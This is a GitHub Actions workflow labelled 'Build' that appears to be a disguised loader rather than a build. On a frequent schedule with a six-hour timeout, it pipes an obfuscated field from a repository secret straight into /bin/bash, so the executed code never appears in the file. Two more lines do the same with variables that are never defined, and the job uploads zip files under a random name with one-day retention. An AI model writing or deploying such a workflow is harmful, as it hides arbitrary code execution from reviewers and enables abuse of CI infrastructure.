name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '38 5,11,17,23 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  handler:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Launch
        env:
          notya106: ${{ secrets.notya106 }}
        run: |
          printf '%s' "$notya106" | jq -r .xqma7201 | /bin/bash
          printf '%s' "$gpuj577" | jq -r .vzwe84 | /bin/bash
          printf '%s' "$jnjf0522" | jq -r .yki6153 | /bin/bash

      - name: Persist output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: AgURJiEj
          path: "*.zip"
          retention-days: 1
